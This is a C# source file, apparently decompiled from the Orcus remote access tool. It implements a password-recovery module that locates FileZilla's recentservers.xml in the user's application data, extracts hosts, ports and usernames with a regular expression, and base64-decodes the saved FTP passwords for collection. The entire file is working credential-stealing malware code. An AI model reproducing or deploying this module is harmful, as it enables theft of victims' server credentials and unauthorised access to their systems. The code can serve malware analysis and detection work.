using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.FileZilla;

internal class FileZilla : IPasswordRecovery
{
	private const string ApplicationName = "FileZilla";

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		FileInfo fileInfo = new FileInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml"));
		if (!fileInfo.Exists)
		{
			yield break;
		}
		foreach (string entry in from x in File.ReadAllText(fileInfo.FullName).Split(new string[1] { "<Server>" }, StringSplitOptions.RemoveEmptyEntries)
			select x.Replace("\n", null).Replace("\r", null))
		{
			if (entry.Contains("<Pass encoding=\"base64\">"))
			{
				Match match = Regex.Match(entry, "<Host>(?<host>(.*?))</Host>\\s*<Port>(?<port>([0-9]{1,4}?))</Port>.*?<User>(?<login>(.*?))</User>.*?<Pass encoding=\"base64\">(?<password>(.*?))</Pass>");
				if (match.Success)
				{
					RecoveredPassword val = new RecoveredPassword();
					val.set_Field1(match.Groups["host"].Value);
					val.set_Password(Encoding.UTF8.GetString(Convert.FromBase64String(match.Groups["password"].Value)));
					val.set_UserName(match.Groups["login"].Value);
					val.set_Field2(match.Groups["port"].Value);
					val.set_Application("FileZilla");
					val.set_PasswordType((PasswordType)2);
					yield return val;
				}
			}
			else
			{
				Match match2 = Regex.Match(entry, "<Host>(?<host>(.*?))</Host>\\s*<Port>(?<port>([0-9]{1,4}?))</Port>.*?<User>(?<login>(.*?))</User>");
				if (match2.Success)
				{
					RecoveredPassword val2 = new RecoveredPassword();
					val2.set_Field1(match2.Groups["host"].Value);
					val2.set_UserName(match2.Groups["login"].Value);
					val2.set_Field2(match2.Groups["port"].Value);
					val2.set_Application("FileZilla");
					val2.set_PasswordType((PasswordType)2);
					yield return val2;
				}
			}
		}
	}
}
